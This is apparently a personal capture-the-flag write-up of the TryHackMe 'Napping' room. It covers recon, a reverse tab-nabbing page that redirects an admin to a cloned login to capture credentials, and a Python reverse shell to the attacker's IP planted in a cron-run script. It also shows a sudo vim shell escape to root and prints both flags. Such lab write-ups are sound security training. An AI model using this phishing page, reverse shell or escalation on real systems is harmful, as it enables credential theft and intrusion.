<h1 align="center">Napping</h1>
<p align="center"><em>Even Admins can fall asleep on the job</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/9d1fc95b-0e87-4b3e-a0a3-b11fbfb933e5"><br>
July 13, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my <code>433</code>-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>. It is classified as a medium-levelchallenge.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/nappingis1337">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/da3bda99-de43-41a4-a47d-5d9376d74440"></p>

<br>

<h2>Task 1 .Napping Flags</h2>
<p>To hack into this machine, you must look at the source and focus on the target.</p>

<br>

<p><em>Answer the questions below</em></p>

<p>1.1. What is the user flag?<br>
<code>THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}</code></p>

<br>

<p>1.2. What is the root flag?<br>
<code>THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}</code></p>

<br>
<br>

<h1>Reconnaissance</h1>
<h2>Active Reconnaissance</h2>
<h3>Port Scanning using <code>nmap</code></h3>

```bash
:~/Napping# nmap -sC -sV -p- -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
```

```bash
:~/Napping# nmap -sC -sV -p- -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
```

<h3>TargetIP</h3>

<img width="1109" height="272" alt="image" src="https://github.com/user-attachments/assets/c66696f0-01a3-4ed6-aa45-34840ff4051e" />


<h3>directory and file enumeration using <code>gobuster</code></h3>

<p>

- <code>/index.php</code><br>
- <code>/register.php</code><br>
- <code>/admin</code><br>
- <code>/welcome.php</code><br>
- <code>/logout.php</code><br>
- <code>/config.php</code><br></p>

```bash
~/Napping# gobuster dir -u http://TargetIP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -x txt,php,js,back,old,html -t 80
...
http://TargetIP/.php                 (Status: 403) [Size: 277]
http://TargetIP/.html-t              (Status: 403) [Size: 277]
http://TargetIP/index.php            (Status: 200) [Size: 1211]
http://TargetIP/register.php         (Status: 200) [Size: 1567]
http://TargetIP/admin                (Status: 301) [Size: 312] [--> http://TargetIP/admin/]
http://TargetIP/welcome.php          (Status: 302) [Size: 0] [--> index.php]
http://TargetIP/logout.php           (Status: 302) [Size: 0] [--> index.php]
http://TargetIP/config.php           (Status: 200) [Size: 1]
http://TargetIP/.php                 (Status: 403) [Size: 277]
http://TargetIP/.html-t              (Status: 403) [Size: 277]
http://TargetIP/server-status        (Status: 403) [Size: 277]
```

<h3>directory and file enumeration using <code>dirsearch</code></h3>

```bash
~/Napping# dirsearch -u http://TargetIP
...
[xx:xx:xx] 200 -    0B  - /admin/config.php
[xx:xx:xx] 200 -  499B  - /admin/login.php
[xx:xx:xx] 200 -    1B  - /config.php
[xx:xx:xx] 200 -  537B  - /index.php/login/
[xx:xx:xx] 302 -    0B  - /logout.php  ->  index.php
[xx:xx:xx] 200 -  564B  - /register.php
```

<p>/etc/hosts</p>

```bash
TargetIP
```

<br>

```bash
~/Napping# dirsearch -u http://napping.thm/admin/
...
[xx:xx:xx] 200 -    0B  - /admin/config.php
[xx:xx:xx] 200 -  499B  - /admin/login.php
[xx:xx:xx] 302 -    0B  - /admin/logout.php  ->  login.php
```


<h3>napping.thm/register.php, napping.thm/login.php and napping.thm/welcome.php</h3>

<p>

- registered <code>researcher</code> : <code>password</code><br>
- logged in<br>
- receivedc a welcome message</p>

<img width="1126" height="480" alt="image" src="https://github.com/user-attachments/assets/8cb1d882-2a0f-4bb1-a1c7-6d353b9819f5" />

<h3>link</h3>
<p>

- submitted google´s link</p>

<img width="1125" height="406" alt="image" src="https://github.com/user-attachments/assets/c091747a-f5f6-4867-8275-b29b2d5955e7" />

<p>

- clicked <code>Here</code>.<br>
- was redirected to Google</p>

<h3>Source Code of <code>napping.thm/welcome.php</code></h3>
<p>

- identified target = 'blank'
</p>

<img width="1118" height="424" alt="image" src="https://github.com/user-attachments/assets/8397663a-6ba7-4c5e-810d-11221c10efcb" />


<h3>HackTricks</h3>
<p>https://hacktricks.boitatech.com.br/pentesting-web/reverse-tab-nabbing</p>

<img width="1341" height="583" alt="image" src="https://github.com/user-attachments/assets/c154caa4-bdd6-459d-8f85-75c296fbab3a" />

<img width="1890" height="864" alt="image" src="https://github.com/user-attachments/assets/8250caaf-dcc5-46e7-9153-c7e7bd6411a0" />


<h3>login.html</h3>
<p>It is a copy of <code>napping.thm/admin/login.php</code></p>


```bash
:~/Napping# curl http://TargetIP/admin/login.php -o login.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1158  100  1158    0     0   141k      0 --:--:-- --:--:-- --:--:--  141k
```


<h3>hi.html</h3>

```bash
<!DOCTYPE html>
<html>
 <body>
  <script>
     window.opener.location = "http://10.10.36.146:8000/login.html";
  </script>
 </body>
</html>

```


<h3>Action</h3>
<p>

- entered <code>http://AttackIP:4444/hello.html</code><br>
- clicked <code>Submit</code>
- clicked <code>Here</code>
</p>

<h3>http servers</h3>

```bash
~/Napping# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
TargetIP - - [xx/Jul/2025 xx:xx:xx] "GET /hi.html HTTP/1.1" 200 -
```


```bash
:~/Napping# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
TargetIP - - [xx/Jul/2025 xx:xx:xx] "GET /login.html HTTP/1.1" 200 -
```

<h3>Wireshark</h3>

<h3>GET /hi.html</h3>

<img width="747" height="292" alt="image" src="https://github.com/user-attachments/assets/2ba8db48-81ad-4b57-a2a2-b4697fc9422a" />

<h3>GET /login.html</h3>

<img width="753" height="304" alt="image" src="https://github.com/user-attachments/assets/d59f1865-2564-4e64-80a0-1c2d968d9b3e" />


<h3>POST /login.html</h3>
<p>username=daniel&password=C%40ughtm3napping123 --> C@ughtm3napping123</p>

<img width="760" height="160" alt="image" src="https://github.com/user-attachments/assets/731d2ba3-d0f5-40ba-a344-2c4383b2cda0" />


<h3>ssh</h3>

```bash
:~/Napping# ssh daniel@napping.thm
...
daniel@ip-10-10-89-107:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)
daniel@ip-10-10-89-107:~$ find / -group administrators 2>/dev/null
/home/adrian/query.py
daniel@ip-10-10-89-107:/home$ ls
adrian  daniel  ubuntu
daniel@ip-10-10-89-107:/home/adrian$ ls
query.py  site_status.txt  user.txt
daniel@ip-10-10-89-107:/home/adrian$ cat query.py
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
daniel@ip-10-10-89-107:/home/adrian$ cat user.txt
cat: user.txt: Permission denied
daniel@ip-10-10-89-107:/home/adrian$ cat user.txt
cat: user.txt: Permission denied
daniel@ip-10-10-89-107:/home/adrian$ cat /home/adrian/site_status.txt
Site is Up: 13/07/2025 23:50:01
Site is Up: 13/07/2025 23:51:01
daniel@ip-10-10-89-107:/home/adrian$ nano query.py
```


```bash
from datetime import datetime
import requests

import os,pty,socket;
s=socket.socket();
s.connect(("10.10.36.146",9001));
[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
```


```bash
$ id
id
uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),1002(administrators)
$ which python3
which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
adrian@ip-10-10-89-107:~$ ^Z
[1]+  Stopped                 nc -nlvp 9001
root@ip-10-10-36-146:~/Napping# stty raw -echo; fg
nc -nlvp 9001

adrian@ip-10-10-89-107:~$ pwd
/home/adrian
adrian@ip-10-10-89-107:~$ cat user.txt
THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}
adrian@ip-10-10-89-107:~$ 
```

<br>
<br>

```bash
adrian@ip-10-10-89-107:~$ sudo -l
Matching Defaults entries for adrian on ip-10-10-89-107:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on ip-10-10-89-107:
    (root) NOPASSWD: /usr/bin/vim
adrian@ip-10-10-89-107:~$ sudo /usr/bin/vim -c ':!/bin/sh'
```

```bash
:!/bin/sh

# cat /root/root.txt
THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}
```


<br>

<h1 align="center">Room Completed</h1>
<br>
<p align="center">
<img width="1000px" src="https://github.com/user-attachments/assets/b055798e-3034-4c03-838f-e28f2be8fce8"><br>
<img width="1000px" src="https://github.com/user-attachments/assets/35b6fa04-89b8-4121-af76-2bdbca5b00b3"></p>


<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 13, 2025     | 433      |     160ᵗʰ    |      5ᵗʰ     |    189ᵗʰ    |     8ᵗʰ    |  114,585 |    854    |     64    |

</div>

<p align="center"> Global All Time:  160ᵗʰ<br><br><img width="200px" src="https://github.com/user-attachments/assets/bdf625a9-57f9-4ffb-8544-40c39a5a71fd"><br>
                                                  <img width="1000px" src="https://github.com/user-attachments/assets/2144b4e2-39f5-4865-9eef-dadd4174973c"></p>

<p align="center"> Brazil All Time:   5ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/633dd9dd-2b91-4604-b92e-8d9f9ecbf26f"> </p>

<p align="center"> Global monthly:    189ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/be3d6057-18e9-4786-bd8d-bda03c5d7edf"> </p>

<p align="center"> Brazil monthly:    8ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/06edc12b-7006-4092-9b85-4f8d8e5fa4fa"> </p>

